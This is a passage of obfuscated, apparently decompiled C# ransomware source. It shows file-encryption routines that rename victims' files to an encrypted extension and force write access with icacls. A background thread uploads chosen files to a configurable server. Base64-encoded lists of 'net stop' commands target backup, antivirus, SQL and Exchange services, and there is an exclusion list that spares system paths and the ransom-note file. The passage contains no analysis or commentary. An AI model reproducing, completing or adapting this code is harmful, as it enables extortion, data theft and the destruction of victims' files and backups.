						UkvSKngWEJZsJKEGJr(jLGThbkXlozfB("aWNhY2xzLmV4ZQ=="), "\"" + item + "\"" + jLGThbkXlozfB("IC9ncmFudCA=") + "\"" + Environment.UserName + "\"" + jLGThbkXlozfB("OkYgL1QgL0MgL1E="));
					}
				}
				catch (Exception ex2)
				{
					if (dwCcrxocWgDvY)
					{
						try
						{
							File.AppendAllText(HXSuIBiFjcFlYv, "File: " + item + " - Error while checking for user write access permission: " + ex2.Message + "\r\n");
						}
						catch (Exception)
						{
						}
					}
					continue;
				}
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex4)
					{
						if (dwCcrxocWgDvY)
						{
							try
							{
								File.AppendAllText(HXSuIBiFjcFlYv, "File: " + item + " - Error while reading if filesize is zero: " + ex4.Message + "\r\n");
							}
							catch (Exception)
							{
							}
						}
						sasdvwkURzh++;
						goto end_IL_050e;
					}
					if (UuZGAMCoQIPQQk == "YES" && new FileInfo(item).Length > Convert.ToInt32(OQWxDJYHGaO) * 1024 * 1024 && !LODlxdahcYJ.Contains(t1))
					{
						try
						{
							if (JuQZsOpwLv != ".*")
							{
								if (VWdYBLRBOWpKB)
								{
									JuQZsOpwLv = eyshXlTBtKESKXUD + JuQZsOpwLv;
								}
								File.Move(item, item + JuQZsOpwLv);
							}
						}
						catch (Exception ex6)
						{
							if (dwCcrxocWgDvY)
							{
								try
								{
									File.AppendAllText(HXSuIBiFjcFlYv, "File: " + item + " - Error while renaming to crypted extension: " + ex6.Message + "\r\n");
								}
								catch (Exception)
								{
								}
							}
							sasdvwkURzh++;
							goto end_IL_050e;
						}
						RYBnEKAqHJtC = "";
						if (JuQZsOpwLv != ".*")
						{
							RYBnEKAqHJtC = item + JuQZsOpwLv;
						}
						else
						{
							RYBnEKAqHJtC = item;
						}
						if (mAubhToVWX == "YES")
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in DqnvzCWPBFOfV)
								{
									if (RYBnEKAqHJtC.ToLower().EndsWith(item2 + JuQZsOpwLv) && gfooytrIBEuhQ == "YES")
									{
										if (Convert.ToInt32(PHGxbhgUwHl) * 1024 * 1024 > new FileInfo(RYBnEKAqHJtC).Length)
										{
											try
											{
												dOKSsqBdzEjH.pEDftRXwVmeoGGRN("URL", "USERNAME", "ACCESO", RYBnEKAqHJtC);
											}
											catch
											{
											}
										}
									}
									else if (RYBnEKAqHJtC.ToLower().EndsWith(item2) && gfooytrIBEuhQ == "NO")
									{
										try
										{
											dOKSsqBdzEjH.pEDftRXwVmeoGGRN("URL", "USERNAME", "ACCESO", RYBnEKAqHJtC);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = utDHmaEnPafSsZ.zXqCMkpXvvDkS(32);
						string text2 = "";
						text2 = (gIEIPYSAmb ? utDHmaEnPafSsZ.GdIXFYPygrqzMs() : "");
						string s = JXLBTRDtuzyaHWFE.hHOovCgFovscyM(text + text2);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (pCwzfECATcgjvGf == "NO")
						{
							byte[] array = null;
							byte[] array2 = xPAIwPiUUms.nBfapMPZnVY(RYBnEKAqHJtC, Convert.ToInt32(OQWxDJYHGaO) * 1024 * 1024);
							if (xPAIwPiUUms.YcWbtomCNUm(aGHJdwQqOXo: (!UZbqPEyevT) ? (gIEIPYSAmb ? xPAIwPiUUms.eiKYzlcqJmBscwSj(array2, Convert.FromBase64String(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : xPAIwPiUUms.eiKYzlcqJmBscwSj(array2, Convert.FromBase64String(eddVxanYaxlAWs), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (gIEIPYSAmb ? CADchyJmisYEw.TMSpHRQaaiOBKQ(array2, Convert.FromBase64String(text), Convert.FromBase64String(text2)) : CADchyJmisYEw.TMSpHRQaaiOBKQ(array2, Convert.FromBase64String(eddVxanYaxlAWs), Convert.FromBase64String(xcViaPUwRrRv))), BGtbjBjZGJVGg: RYBnEKAqHJtC, KOdDPjVHDFbTgV: bytes))
							{
								goto IL_0b81;
							}
							try
							{
								File.Move(item + JuQZsOpwLv, item);
							}
							catch (Exception)
							{
							}
						}
						else if (!gIEIPYSAmb)
						{
							if (dRHdGUnJfHhyVsbn.OOezEpsxnEQlad(RYBnEKAqHJtC, OQWxDJYHGaO, eddVxanYaxlAWs, null, Convert.FromBase64String(xcViaPUwRrRv)))
							{
								goto IL_0b81;
							}
							try
							{
								File.Move(item + JuQZsOpwLv, item);
							}
							catch (Exception)
							{
							}
						}
						else
						{
							if (dRHdGUnJfHhyVsbn.OOezEpsxnEQlad(RYBnEKAqHJtC, OQWxDJYHGaO, text, bytes, Convert.FromBase64String(text2)))
							{
								goto IL_0b81;
							}
							try
							{
								File.Move(item + JuQZsOpwLv, item);
							}
							catch (Exception)
							{
							}
						}
						continue;
					}
					if (VWdYBLRBOWpKB)
					{
						JuQZsOpwLv = eyshXlTBtKESKXUD + JuQZsOpwLv;
					}
					string text3 = utDHmaEnPafSsZ.zXqCMkpXvvDkS(32);
					string text4 = "";
					text4 = (gIEIPYSAmb ? utDHmaEnPafSsZ.GdIXFYPygrqzMs() : "");
					string s2 = JXLBTRDtuzyaHWFE.hHOovCgFovscyM(text3 + text4);
					byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
					if (JuQZsOpwLv != ".*")
					{
						if (!EepcEiTneJt)
						{
							if (!gIEIPYSAmb)
							{
								XsskrIIoBJbNJ(item, item + JuQZsOpwLv, ydkkPXGHXdHLQJ);
							}
							else
							{
								XsskrIIoBJbNJ(item, item + JuQZsOpwLv, Convert.FromBase64String(text3));
							}
						}
						else
						{
							try
							{
								if (!gIEIPYSAmb)
								{
									yxXpRbVOOCdryf(item, item + JuQZsOpwLv, ydkkPXGHXdHLQJ, Convert.FromBase64String(xcViaPUwRrRv));
								}
								else
								{
									yxXpRbVOOCdryf(item, item + JuQZsOpwLv, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
								}
							}
							catch (Exception ex11)
							{
								if (dwCcrxocWgDvY)
								{
									try
									{
										File.AppendAllText(HXSuIBiFjcFlYv, "File: " + item + " - Error while fully writing to file: " + ex11.Message + "\r\n");
									}
									catch (Exception)
									{
									}
								}
								sasdvwkURzh++;
								try
								{
									File.Move(item + JuQZsOpwLv, item);
								}
								catch (Exception)
								{
								}
								goto end_IL_050e;
							}
						}
					}
					else if (!EepcEiTneJt)
					{
						if (!gIEIPYSAmb)
						{
							XsskrIIoBJbNJ(item, item + ".part", ydkkPXGHXdHLQJ);
						}
						else
						{
							XsskrIIoBJbNJ(item, item + ".part", Convert.FromBase64String(text3));
						}
					}
					else
					{
						try
						{
							if (!gIEIPYSAmb)
							{
								yxXpRbVOOCdryf(item, item, ydkkPXGHXdHLQJ, Convert.FromBase64String(xcViaPUwRrRv));
							}
							else
							{
								yxXpRbVOOCdryf(item, item, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
							}
						}
						catch (Exception ex14)
						{
							if (dwCcrxocWgDvY)
							{
								try
								{
									File.AppendAllText(HXSuIBiFjcFlYv, "File: " + item + " - Error while fully writing to file: " + ex14.Message + "\r\n");
								}
								catch (Exception)
								{
								}
							}
							sasdvwkURzh++;
							goto end_IL_050e;
						}
					}
					if (gIEIPYSAmb)
					{
						if (JuQZsOpwLv != ".*")
						{
							AMIJuyhJOIXX(item + JuQZsOpwLv, bytes2);
						}
						else
						{
							AMIJuyhJOIXX(item, bytes2);
						}
					}
					goto IL_0b81;
					end_IL_050e:;
				}
				catch (Exception)
				{
					goto IL_0b81;
				}
				continue;
				IL_0b81:
				eEnQHOfToOQYn.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__3e(string fileInfo)
		{
			if (!fileInfo.Contains("C:\\Program Files\\") && !fileInfo.Contains("C:\\Program Files (x86)\\") && !fileInfo.Contains(":\\Windows\\") && !fileInfo.ToLower().Contains("perflogs") && !fileInfo.ToLower().Contains("internet explorer") && !fileInfo.Contains(":\\ProgramData\\") && !fileInfo.Contains("\\AppData\\") && !fileInfo.ToLower().Contains("msocache") && !fileInfo.ToLower().Contains("system volume information") && !fileInfo.ToLower().Contains("boot") && !fileInfo.ToLower().Contains("tor browser") && !fileInfo.ToLower().Contains("mozilla") && !fileInfo.ToLower().Contains("google chrome") && !fileInfo.ToLower().Contains("application data") && !fileInfo.Contains("autoexec.bat") && !fileInfo.Contains("desktop.ini") && !fileInfo.Contains("autorun.inf") && !fileInfo.Contains("ntuser.dat") && !fileInfo.Contains("NTUSER.DAT") && !fileInfo.Contains("iconcache.db") && !fileInfo.Contains("bootsect.bak") && !fileInfo.Contains("boot.ini") && !fileInfo.Contains("ntuser.dat.log") && !fileInfo.Contains("thumbs.db") && !fileInfo.ToLower().Contains("bootmgr") && !fileInfo.ToLower().Contains("pagefile.sys") && !fileInfo.ToLower().Contains("config.sys") && !fileInfo.ToLower().Contains("ntuser.ini") && !fileInfo.Contains(jLGThbkXlozfB("QnVpbGRlcl9Mb2c=")) && !fileInfo.Contains("RSAKeys") && !fileInfo.Contains("Config.enc") && !fileInfo.Contains("Инструкция") && !fileInfo.EndsWith(JuQZsOpwLv) && !fileInfo.EndsWith("exe") && !fileInfo.EndsWith("dll") && !fileInfo.EndsWith("EXE") && !fileInfo.EndsWith("DLL") && !fileInfo.Contains("Recycle.Bin") && !fileInfo.Contains(jMMJJGmjJwKTlH) && !fileInfo.Contains(HXSuIBiFjcFlYv) && !fileInfo.Contains(QHZTFDubwp))
			{
				if (KbohVtOfIVDaJO.Length != 0)
				{
					string[] kbohVtOfIVDaJO = KbohVtOfIVDaJO;
					int num = 0;
					while (num < kbohVtOfIVDaJO.Length)
					{
						string value = kbohVtOfIVDaJO[num];
						if (!fileInfo.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0d5b;
					}
				}
				try
				{
					if (fileInfo.EndsWith(JuQZsOpwLv))
					{
						goto IL_0d5b;
					}
				}
				catch (Exception)
				{
					goto IL_0d5b;
				}
				if (!snFJjGniiHtdTSH.Contains(fileInfo))
				{
					if (LDVZsbBiyOrU == "YES")
					{
						try
						{
							if (MYiVoJiDPuw.iXUrCyWwbDDP(fileInfo))
							{
								MYiVoJiDPuw.jBdsvnmIaKEzR(fileInfo);
							}
						}
						catch
						{
						}
					}
					snFJjGniiHtdTSH.Add(fileInfo);
					if (!UYClCmRdPD.Contains(Path.GetDirectoryName(fileInfo)))
					{
						UYClCmRdPD.Add(Path.GetDirectoryName(fileInfo));
					}
					CRHPenLGYTyWUT(fileInfo);
					try
					{
						new utrmZEFXTZjn().MXDXNXSoXoRHAN(fileInfo);
					}
					catch
					{
					}
					try
					{
						using FileStream fileStream = new FileStream(fileInfo, FileMode.Open, FileAccess.Write);
						if (!fileStream.CanWrite)
						{
							try
							{
								if (MFBaFacYIYTeS)
								{
									Console.WriteLine("Setting write access permission: " + fileInfo + " - File Size: " + new FileInfo(fileInfo).Length + " bytes");
									Console.WriteLine("----------------------------------------------------------------------------");
								}
							}
							catch
							{
							}
							UkvSKngWEJZsJKEGJr(jLGThbkXlozfB("aWNhY2xzLmV4ZQ=="), "\"" + fileInfo + "\"" + jLGThbkXlozfB("IC9ncmFudCA=") + "\"" + Environment.UserName + "\"" + jLGThbkXlozfB("OkYgL1QgL0MgL1E="));
						}
					}
					catch (Exception ex2)
					{
						if (dwCcrxocWgDvY)
						{
							try
							{
								File.AppendAllText(HXSuIBiFjcFlYv, "File: " + fileInfo + " - Error while checking for user write access permission: " + ex2.Message + "\r\n");
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
						return;
					}
					try
					{
						try
						{
							if (new FileInfo(fileInfo).Length != 0L)
							{
								goto end_IL_0651;
							}
							goto end_IL_0651_2;
							end_IL_0651:;
						}
						catch (Exception ex4)
						{
							if (dwCcrxocWgDvY)
							{
								try
								{
									File.AppendAllText(HXSuIBiFjcFlYv, "File: " + fileInfo + " - Error while reading if filesize is zero: " + ex4.Message + "\r\n");
								}
								catch (Exception)
								{
								}
							}
							sasdvwkURzh++;
							goto end_IL_0651_2;
						}
						if (UuZGAMCoQIPQQk == "YES" && new FileInfo(fileInfo).Length > Convert.ToInt32(OQWxDJYHGaO) * 1024 * 1024)
						{
							try
							{
								if (JuQZsOpwLv != ".*")
								{
									if (VWdYBLRBOWpKB)
									{
										JuQZsOpwLv = eyshXlTBtKESKXUD + JuQZsOpwLv;
									}
									File.Move(fileInfo, fileInfo + JuQZsOpwLv);
								}
							}
							catch (Exception ex6)
							{
								if (dwCcrxocWgDvY)
								{
									try
									{
										File.AppendAllText(HXSuIBiFjcFlYv, "File: " + fileInfo + " - Error while renaming to crypted extension: " + ex6.Message + "\r\n");
									}
									catch (Exception)
									{
									}
								}
								sasdvwkURzh++;
								return;
							}
							if (JuQZsOpwLv != ".*")
							{
								fileInfo += JuQZsOpwLv;
							}
							if (mAubhToVWX == "YES")
							{
								Thread thread = new Thread((ThreadStart)delegate
								{
									foreach (string item in DqnvzCWPBFOfV)
									{
										if (fileInfo.ToLower().EndsWith(item + JuQZsOpwLv) && gfooytrIBEuhQ == "YES")
										{
											if (Convert.ToInt32(PHGxbhgUwHl) * 1024 * 1024 > new FileInfo(fileInfo).Length)
											{
												try
												{
													dOKSsqBdzEjH.pEDftRXwVmeoGGRN("URL", "USERNAME", "ACCESO", fileInfo);
												}
												catch
												{
												}
											}
										}
										else if (fileInfo.ToLower().EndsWith(item) && gfooytrIBEuhQ == "NO")
										{
											try
											{
												dOKSsqBdzEjH.pEDftRXwVmeoGGRN("URL", "USERNAME", "ACCESO", fileInfo);
											}
											catch
											{
											}
										}
									}
								});
								thread.IsBackground = false;
								thread.Priority = ThreadPriority.Normal;
								thread.Start();
							}
							string text = utDHmaEnPafSsZ.zXqCMkpXvvDkS(32);
							string text2 = "";
							text2 = (gIEIPYSAmb ? utDHmaEnPafSsZ.GdIXFYPygrqzMs() : "");
							string s = JXLBTRDtuzyaHWFE.hHOovCgFovscyM(text + text2);
							byte[] bytes = Encoding.ASCII.GetBytes(s);
							if (pCwzfECATcgjvGf == "NO")
							{
								byte[] array = null;
								byte[] array2 = xPAIwPiUUms.nBfapMPZnVY(fileInfo, Convert.ToInt32(OQWxDJYHGaO) * 1024 * 1024);
								if (!xPAIwPiUUms.YcWbtomCNUm(aGHJdwQqOXo: (!UZbqPEyevT) ? (gIEIPYSAmb ? xPAIwPiUUms.eiKYzlcqJmBscwSj(array2, Convert.FromBase64String(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : xPAIwPiUUms.eiKYzlcqJmBscwSj(array2, Convert.FromBase64String(eddVxanYaxlAWs), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (gIEIPYSAmb ? CADchyJmisYEw.TMSpHRQaaiOBKQ(array2, Convert.FromBase64String(text), Convert.FromBase64String(text2)) : CADchyJmisYEw.TMSpHRQaaiOBKQ(array2, Convert.FromBase64String(eddVxanYaxlAWs), Convert.FromBase64String(xcViaPUwRrRv))), BGtbjBjZGJVGg: fileInfo, KOdDPjVHDFbTgV: bytes))
								{
									try
									{
										File.Move(fileInfo + JuQZsOpwLv, fileInfo);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!gIEIPYSAmb)
							{
								if (!dRHdGUnJfHhyVsbn.OOezEpsxnEQlad(fileInfo, OQWxDJYHGaO, eddVxanYaxlAWs, null, Convert.FromBase64String(xcViaPUwRrRv)))
								{
									try
									{
										File.Move(fileInfo + JuQZsOpwLv, fileInfo);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!dRHdGUnJfHhyVsbn.OOezEpsxnEQlad(fileInfo, OQWxDJYHGaO, text, bytes, Convert.FromBase64String(text2)))
							{
								try
								{
									File.Move(fileInfo + JuQZsOpwLv, fileInfo);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else
						{
							if (VWdYBLRBOWpKB)
							{
								JuQZsOpwLv = eyshXlTBtKESKXUD + JuQZsOpwLv;
							}
							string text3 = utDHmaEnPafSsZ.zXqCMkpXvvDkS(32);
							string text4 = "";
							text4 = (gIEIPYSAmb ? utDHmaEnPafSsZ.GdIXFYPygrqzMs() : "");
							string s2 = JXLBTRDtuzyaHWFE.hHOovCgFovscyM(text3 + text4);
							byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
							if (JuQZsOpwLv != ".*")
							{
								if (!EepcEiTneJt)
								{
									if (!gIEIPYSAmb)
									{
										XsskrIIoBJbNJ(fileInfo, fileInfo + JuQZsOpwLv, ydkkPXGHXdHLQJ);
									}
									else
									{
										XsskrIIoBJbNJ(fileInfo, fileInfo + JuQZsOpwLv, Convert.FromBase64String(text3));
									}
								}
								else
								{
									try
									{
										if (!gIEIPYSAmb)
										{
											yxXpRbVOOCdryf(fileInfo, fileInfo + JuQZsOpwLv, ydkkPXGHXdHLQJ, Convert.FromBase64String(xcViaPUwRrRv));
										}
										else
										{
											yxXpRbVOOCdryf(fileInfo, fileInfo + JuQZsOpwLv, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
										}
									}
									catch (Exception ex11)
									{
										if (dwCcrxocWgDvY)
										{
											try
											{
												File.AppendAllText(HXSuIBiFjcFlYv, "File: " + fileInfo + " - Error while fully writing to file: " + ex11.Message + "\r\n");
											}
											catch (Exception)
											{
											}
										}
										sasdvwkURzh++;
										try
										{
											File.Move(fileInfo + JuQZsOpwLv, fileInfo);
											return;
										}
										catch (Exception)
										{
											return;
										}
									}
								}
							}
							else if (!EepcEiTneJt)
							{
								if (!gIEIPYSAmb)
								{
									XsskrIIoBJbNJ(fileInfo, fileInfo + ".part", ydkkPXGHXdHLQJ);
								}
								else
								{
									XsskrIIoBJbNJ(fileInfo, fileInfo + ".part", Convert.FromBase64String(text3));
								}
							}
							else
							{
								try
								{
									if (!gIEIPYSAmb)
									{
										yxXpRbVOOCdryf(fileInfo, fileInfo, ydkkPXGHXdHLQJ, Convert.FromBase64String(xcViaPUwRrRv));
									}
									else
									{
										yxXpRbVOOCdryf(fileInfo, fileInfo, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
									}
								}
								catch (Exception ex14)
								{
									if (dwCcrxocWgDvY)
									{
										try
										{
											File.AppendAllText(HXSuIBiFjcFlYv, "File: " + fileInfo + " - Error while fully writing to file: " + ex14.Message + "\r\n");
										}
										catch (Exception)
										{
										}
									}
									sasdvwkURzh++;
									return;
								}
							}
							if (gIEIPYSAmb)
							{
								if (JuQZsOpwLv != ".*")
								{
									AMIJuyhJOIXX(fileInfo + JuQZsOpwLv, bytes2);
								}
								else
								{
									AMIJuyhJOIXX(fileInfo, bytes2);
								}
							}
						}
						end_IL_0651_2:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_0d5b;
			IL_0d5b:
			eEnQHOfToOQYn.Remove(fileInfo);
		}
	}

	[CompilerGenerated]
	private sealed class gPcVboYtgZAms
	{
		public string wDyOWRByGrCyM;

		public string zXlRxIvoDhm;

		public void _003CEncrypt2_003Eb__4c()
		{
			while (true)
			{
				try
				{
					File.Delete(wDyOWRByGrCyM);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__4d()
		{
			while (true)
			{
				try
				{
					if (File.Exists(zXlRxIvoDhm))
					{
						File.Delete(zXlRxIvoDhm);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string gWQFGvpCVwGF = "EVET";

	public static string[] WZNYeqPCEvW;

	public static IEnumerable<DirectoryInfo> pcyRoVvTVose;

	public static byte[] ydkkPXGHXdHLQJ = null;

	public static DirectoryInfo AcRDZwnsfkIrQ;

	public static string CWUUcxmowiDg = "NO";

	public static string mdaIzrMUGsBhh = "100000000";

	public static List<string> lZNmNTLNdP = new List<string>();

	public static List<string> WBrxAtwaErgb = new List<string>();

	public static string lMeUFQvXnYqbYME = "NO";

	public static string eddVxanYaxlAWs = "";

	public static string xcViaPUwRrRv = "";

	public static string WepagbesBWfUGP = "";

	public static string HTnfErSawbWHbHzse = "NO";

	public static int cWilMsxtbhpPMPPp = 0;

	public static string LDVZsbBiyOrU = "YES";

	public static string ThSfnIdCvNY = "NO";

	public static string WRWNiHGEUcLBskjN = "NO";

	public static string jaiuBHaLnwEwAG = "0";

	public static string fTFJlvNqvUFkC = "NO";

	public static string DvNpqDOWLZb = "NO";

	public static string giEoGQYoWa = "YES";

	public static string PBsnwQvWChTA = "NO";

	public static List<string> VPldzavOggk = new List<string>
	{
		jLGThbkXlozfB("bHNhc3MuZXhl"),
		jLGThbkXlozfB("c3ZjaHN0LmV4ZQ=="),
		jLGThbkXlozfB("Y3Jjc3MuZXhl"),
		jLGThbkXlozfB("Y2hyb21lMzIuZXhl"),
		jLGThbkXlozfB("ZmlyZWZveC5leGU="),
		jLGThbkXlozfB("Y2FsYy5leGU="),
		jLGThbkXlozfB("bXlzcWxkLmV4ZQ=="),
		jLGThbkXlozfB("ZGxsaHN0LmV4ZQ=="),
		jLGThbkXlozfB("b3BlcmEzMi5leGU="),
		jLGThbkXlozfB("bWVtb3AuZXhl"),
		jLGThbkXlozfB("c3Bvb2xjdi5leGU="),
		jLGThbkXlozfB("Y3RmbW9tLmV4ZQ=="),
		jLGThbkXlozfB("U2t5cGVBcHAuZXhl")
	};

	public static List<string> UYClCmRdPD = new List<string>();

	public static string kmIhcYcmYJ = "YES";

	public static string hVteTYaqLq = "NO";

	public static string mZiFrVAsggub = "NO";

	public static List<string> snFJjGniiHtdTSH = new List<string>();

	public static string oCNjLrdnYNhkSO = "NO";

	private static string loiawqaEulG = "49fe6883-8a65-4018-b8e2-37c2bf408697";

	public static string KlQaUienKdBo = "YES";

	public static string HYjxnmyoAE = "NO";

	public static List<string> QOWWOfGZVlgEkR = new List<string>
	{
		jLGThbkXlozfB("c3RhcnQgRG5zY2FjaGUgL3k="),
		jLGThbkXlozfB("c3RhcnQgRkRSZXNQdWIgL3k="),
		jLGThbkXlozfB("c3RhcnQgU1NEUFNSViAveQ=="),
		jLGThbkXlozfB("c3RhcnQgdXBucGhvc3QgL3k="),
		jLGThbkXlozfB("c3RvcCBhdnBzdXMgL3k="),
		jLGThbkXlozfB("c3RvcCBNY0FmZWVETFBBZ2VudFNlcnZpY2UgL3k="),
		jLGThbkXlozfB("c3RvcCBtZmV3YyAveQ=="),
		jLGThbkXlozfB("c3RvcCBCTVIgQm9vdCBTZXJ2aWNlIC95"),
		jLGThbkXlozfB("c3RvcCBOZXRCYWNrdXAgQk1SIE1URlRQIFNlcnZpY2UgL3k="),
		jLGThbkXlozfB("c3RvcCBEZWZXYXRjaCAveQ=="),
		jLGThbkXlozfB("c3RvcCBjY0V2dE1nciAveQ=="),
		jLGThbkXlozfB("c3RvcCBjY1NldE1nciAveQ=="),
		jLGThbkXlozfB("c3RvcCBTYXZSb2FtIC95"),
		jLGThbkXlozfB("c3RvcCBSVFZzY2FuIC95"),
		jLGThbkXlozfB("c3RvcCBRQkZDU2VydmljZSAveQ=="),
		jLGThbkXlozfB("c3RvcCBRQklEUFNlcnZpY2UgL3k="),
		jLGThbkXlozfB("c3RvcCBJbnR1aXQuUXVpY2tCb29rcy5GQ1MgL3k="),
		jLGThbkXlozfB("c3RvcCBRQkNGTW9uaXRvclNlcnZpY2UgL3k="),
		jLGThbkXlozfB("c3RvcCBZb29CYWNrdXAgL3k="),
		jLGThbkXlozfB("c3RvcCBZb29JVCAveQ=="),
		jLGThbkXlozfB("c3RvcCB6aHVkb25nZmFuZ3l1IC95"),
		jLGThbkXlozfB("c3RvcCBzdGNfcmF3X2FnZW50IC95"),
		jLGThbkXlozfB("c3RvcCBWU05BUFZTUyAveQ=="),
		jLGThbkXlozfB("c3RvcCBWZWVhbVRyYW5zcG9ydFN2YyAveQ=="),
		jLGThbkXlozfB("c3RvcCBWZWVhbURlcGxveW1lbnRTZXJ2aWNlIC95"),
		jLGThbkXlozfB("c3RvcCBWZWVhbU5GU1N2YyAveQ=="),
		jLGThbkXlozfB("c3RvcCB2ZWVhbSAveQ=="),
		jLGThbkXlozfB("c3RvcCBQRFZGU1NlcnZpY2UgL3k="),
		jLGThbkXlozfB("c3RvcCBCYWNrdXBFeGVjVlNTUHJvdmlkZXIgL3k="),
		jLGThbkXlozfB("c3RvcCBCYWNrdXBFeGVjQWdlbnRBY2NlbGVyYXRvciAveQ=="),
		jLGThbkXlozfB("c3RvcCBCYWNrdXBFeGVjQWdlbnRCcm93c2VyIC95"),
		jLGThbkXlozfB("c3RvcCBCYWNrdXBFeGVjRGl2ZWNpTWVkaWFTZXJ2aWNlIC95"),
		jLGThbkXlozfB("c3RvcCBCYWNrdXBFeGVjSm9iRW5naW5lIC95"),
		jLGThbkXlozfB("c3RvcCBCYWNrdXBFeGVjTWFuYWdlbWVudFNlcnZpY2UgL3k="),
		jLGThbkXlozfB("c3RvcCBCYWNrdXBFeGVjUlBDU2VydmljZSAveQ=="),
		jLGThbkXlozfB("c3RvcCBBY3JTY2gyU3ZjIC95"),
		jLGThbkXlozfB("c3RvcCBBY3JvbmlzQWdlbnQgL3k="),
		jLGThbkXlozfB("c3RvcCBDQVNBRDJEV2ViU3ZjIC95"),
		jLGThbkXlozfB("c3RvcCBDQUFSQ1VwZGF0ZVN2YyAveQ=="),
		jLGThbkXlozfB("c3RvcCBzb3Bob3MgL3k="),
		jLGThbkXlozfB("c3RvcCDigJxBY3JvbmlzIFZTUyBQcm92aWRlcuKAnSAveQ=="),
		jLGThbkXlozfB("c3RvcCBNc0R0c1NlcnZlciAveQ=="),
		jLGThbkXlozfB("c3RvcCBJSVNBZG1pbiAveQ=="),
		jLGThbkXlozfB("c3RvcCBNU0V4Y2hhbmdlRVMgL3k="),
		jLGThbkXlozfB("c3RvcCDigJxTb3Bob3MgQWdlbnTigJ0gL3k="),
		jLGThbkXlozfB("c3RvcCBFcmFzZXJTdmMxMTcxMCAveQ=="),
		jLGThbkXlozfB("c3RvcCDigJxFbnRlcnByaXNlIENsaWVudCBTZXJ2aWNl4oCdIC95"),
		jLGThbkXlozfB("c3RvcCDigJxTUUwgQmFja3VwcyAveQ=="),
		jLGThbkXlozfB("c3RvcCBNc0R0c1NlcnZlcjEwMCAveQ=="),
		jLGThbkXlozfB("c3RvcCBOZXRNc21xQWN0aXZhdG9yIC95"),
		jLGThbkXlozfB("c3RvcCBNU0V4Y2hhbmdlSVMgL3k="),
		jLGThbkXlozfB("c3RvcCDigJxTb3Bob3MgQXV0b1VwZGF0ZSBTZXJ2aWNl4oCdIC95"),
		jLGThbkXlozfB("c3RvcCBTYW1TcyAveQ=="),
		jLGThbkXlozfB("c3RvcCBSZXBvcnRTZXJ2ZXIgL3k="),
		jLGThbkXlozfB("c3RvcCDigJxTUUxzYWZlIEJhY2t1cCBTZXJ2aWNl4oCdIC95"),
		jLGThbkXlozfB("c3RvcCBNc0R0c1NlcnZlcjExMCAveQ=="),
		jLGThbkXlozfB("c3RvcCBQT1AzU3ZjIC95"),
		jLGThbkXlozfB("c3RvcCBNU0V4Y2hhbmdlTUdNVCAveQ=="),
		jLGThbkXlozfB("c3RvcCDigJxTb3Bob3MgQ2xlYW4gU2VydmljZeKAnSAveQ=="),
		jLGThbkXlozfB("c3RvcCBTTVRQU3ZjIC95"),
		jLGThbkXlozfB("c3RvcCBSZXBvcnRTZXJ2ZXIkU1FMXzIwMDggL3k="),
		jLGThbkXlozfB("c3RvcCDigJxTUUxzYWZlIEZpbHRlciBTZXJ2aWNl4oCdIC95"),
		jLGThbkXlozfB("c3RvcCBtc2Z0ZXNxbCRQUk9EIC95"),
		jLGThbkXlozfB("c3RvcCBTc3RwU3ZjIC95"),
		jLGThbkXlozfB("c3RvcCBNU0V4Y2hhbmdlTVRBIC95"),
		jLGThbkXlozfB("c3RvcCDigJxTb3Bob3MgRGV2aWNlIENvbnRyb2wgU2VydmljZeKAnSAveQ=="),
		jLGThbkXlozfB("c3RvcCBSZXBvcnRTZXJ2ZXIkU1lTVEVNX0JHQyAveQ=="),
		jLGThbkXlozfB("c3RvcCDigJxTeW1hbnRlYyBTeXN0ZW0gUmVjb3ZlcnnigJ0gL3k="),
		jLGThbkXlozfB("c3RvcCBNU09MQVAkU1FMXzIwMDggL3k="),
		jLGThbkXlozfB("c3RvcCBVSTBEZXRlY3QgL3k="),
		jLGThbkXlozfB("c3RvcCBNU0V4Y2hhbmdlU0EgL3k="),
		jLGThbkXlozfB("c3RvcCDigJxTb3Bob3MgRmlsZSBTY2FubmVyIFNlcnZpY2XigJ0gL3k="),
		jLGThbkXlozfB("c3RvcCBSZXBvcnRTZXJ2ZXIkVFBTIC95"),
		jLGThbkXlozfB("c3RvcCDigJxWZWVhbSBCYWNrdXAgQ2F0YWxvZyBEYXRhIFNlcnZpY2XigJ0gL3k="),
		jLGThbkXlozfB("c3RvcCBNU09MQVAkU1lTVEVNX0JHQyAveQ=="),
		jLGThbkXlozfB("c3RvcCBXM1N2YyAveQ=="),
		jLGThbkXlozfB("c3RvcCBNU0V4Y2hhbmdlU1JTIC95"),
		jLGThbkXlozfB("c3RvcCDigJxTb3Bob3MgSGVhbHRoIFNlcnZpY2XigJ0gL3k="),
		jLGThbkXlozfB("c3RvcCBSZXBvcnRTZXJ2ZXIkVFBTQU1BIC95"),
		jLGThbkXlozfB("c3RvcCDigJxab29seiAyIFNlcnZpY2XigJ0gL3k="),
		jLGThbkXlozfB("c3RvcCBNU09MQVAkVFBTIC95"),
		jLGThbkXlozfB("c3RvcCDigJxhcGhpZG1vbml0b3JzZXJ2aWNl4oCdIC95"),
